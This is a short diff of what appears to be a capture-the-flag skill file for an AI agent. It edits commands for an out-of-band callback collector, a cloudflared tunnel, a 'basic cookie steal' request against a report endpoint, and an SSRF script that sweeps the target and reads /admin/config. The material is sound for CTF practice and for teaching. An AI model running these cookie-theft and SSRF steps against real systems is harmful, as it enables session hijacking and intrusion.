@@ -14,7 +14,7 @@ The instant you read "an admin/operator/reviewer will open your submission", sta
 collector. It is a fixed ~30s cost and it is the only channel you can *trust*:
 
 ```bash
-python ~/.claude/skills/web-ctf/scripts/oob.py --name <challenge>   # prints OOB_URL=
+python3 ~/.claude/skills/web-ctf/scripts/oob.py --name <challenge>   # prints OOB_URL=
 grep -a 'HIT\|FLAG' $CTF_ROOT/<challenge>/oob.log
 ```
 
@@ -60,7 +60,7 @@ explains which fetches are same-origin vs cross-origin, and therefore which need
 
 ```bash
 # tunnel first — see the note below on ngrok vs cloudflared
-/c/Tools/cloudflared.exe tunnel --url http://localhost:8080 &
+cloudflared tunnel --url http://localhost:8080 &
 
 # basic cookie steal
 curl -si -X POST <target>/api/report $AUTH_HEADER -H 'Content-Type: application/json' \
@@ -90,8 +90,8 @@ Cookie arrives → set it as `$AUTH_HEADER` and re-probe everything.
 **Reach for the script first — it does the whole chain including the read primitive below:**
 
 ```bash
-python ~/.claude/skills/web-ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" --sweep
-python ~/.claude/skills/web-ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" /admin/config
+python3 ~/.claude/skills/web-ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" --sweep
+python3 ~/.claude/skills/web-ctf/scripts/ssrfget.py --base <target> --token "$TOKEN" /admin/config
 ```
 
 ### Read the error messages — they tell you if loopback is allowed
